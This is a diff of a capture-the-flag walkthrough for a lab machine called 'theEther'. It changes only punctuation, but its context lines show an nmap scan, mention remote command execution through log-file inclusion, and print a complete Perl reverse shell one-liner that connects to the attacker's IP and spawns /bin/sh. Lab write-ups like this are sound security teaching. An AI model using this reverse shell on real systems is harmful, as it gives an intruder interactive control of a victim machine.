@@ -17,7 +17,7 @@ A mysterious company, _The Ether_ has proclaimed an elixir that considerably alt
 
 ### Information Gathering
 
-Let's kick this off with a `nmap` scan to establish the services available in **theEther**:
+Let's kick this off with a `nmap` scan to establish the services available in **theEther**.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130`
@@ -240,7 +240,7 @@ Content-Type: text/html; charset=iso-8859-1
 </body></html>
 ```
 
-With this in mind, I wrote another script to clean up the output from the remote command execution:
+With this in mind, I wrote another script to clean up the output from the remote command execution.
 
 ```bash
 # cat cmd.sh
@@ -345,7 +345,7 @@ if ($file == "/var/log/auth.log") {
 ?>
 ```
 
-Awesome. Now that I can execute remote commands, it's reverse shell time. I always liked my reverse shell in Perl whenever it's available on the target system:
+Awesome. Now that I can execute remote commands, it's reverse shell time. I always liked my reverse shell in Perl whenever it's available on the target system.
 
 ```perl
 perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
